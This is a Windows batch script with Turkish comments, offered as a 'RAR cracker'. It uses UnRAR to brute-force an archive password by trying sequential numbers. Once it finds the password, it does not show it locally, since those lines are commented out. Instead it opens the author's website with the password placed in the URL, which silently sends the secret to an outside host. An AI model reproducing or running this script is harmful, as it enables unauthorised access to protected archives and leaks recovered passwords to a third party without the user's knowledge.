
:: BU KOD BİLGİSAYAR TİME.COM TARAFINDAN REVİZE EDİLMİŞTİR.
@echo off
title Bilgisayar Time RAR kirici
copy "C:\Program Files\WinRAR\Unrar.exe"
SET PASS=0
SET TMP=TempFold
MD %TMP%
:RAR
color b
cls
echo.
SET/P "NAME=Dosya adi  : "
IF "%NAME%"=="" goto ProblemDetected
goto GPATH
:ProblemDetected
echo bu kismi bos birakamazsin
pause
goto RAR
:GPATH
SET/P "PATH=Tam dosya yolunu girin (ornek: C:\Users\bilgisayartime\Desktop) : "
IF "%PATH%"=="" goto PERROR
goto NEXT
:PERROR
echo bu kismi bos birakamazsin
pause
goto RAR
:NEXT
IF EXIST "%PATH%\%NAME%" GOTO SP
goto PATH
:PATH
cls
echo Dosya bulunamadi. Dosya adinin sonuna (.RAR) uzantisini eklediginize emin olun.
pause
goto RAR
:SP
echo.
echo sifre cozuluyor...
echo.
:START
title islem devam ediyor...
SET /A PASS=%PASS%+1
UNRAR E -INUL -P%PASS% "%PATH%\%NAME%" "%TMP%"
IF /I %ERRORLEVEL% EQU 0 GOTO FINISH
GOTO START
:FINISH
RD %TMP% /Q /S
Del "Unrar.exe"
cls
title 1 sifre BULUNDU
echo.
:: echo File = %NAME%
:: echo Stable Password= %PASS%
echo.
start https://www.bilgisayartime.com/p/bilgisayar-time-rar-sifre-cozucu.html?sifre=%PASS%
echo Herhangi bir tusa basip cikin.
pause>NUL
exit
